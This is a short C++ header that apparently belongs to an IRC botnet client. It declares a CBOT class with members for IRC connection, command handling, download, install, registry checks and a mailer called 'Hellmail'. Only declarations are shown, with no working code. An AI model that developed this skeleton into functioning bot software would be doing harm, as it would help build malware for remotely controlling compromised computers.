

#include "Globals.h"
#include "Commands.h"
#include "Connect.h"
#include "Download.h"
#include "Main.h"
#include "CThread.h"
#include "Utility.h"
#include "MAil.h"

//#define DEBUG_MODE //debug mode
#define SECTION_NAME "BOT"

class CBOT 
{
public:
	bool Check(void);
	CConnectIRC cIRC;
	CCmd vCmd;
	CMain hMain;
	CDownload hDownload;
	CInstall hInstall; 

	CRegCheck hRegcheck;
	CMail Hellmail;
	int main(void);
	int delay(void);
	int HELLMAIN(void);
	bool botRunning;
/*#ifndef OPENSSL
	CSSLSocket			m_csslSocket;	
#endif */
};

extern CBOT *BOT;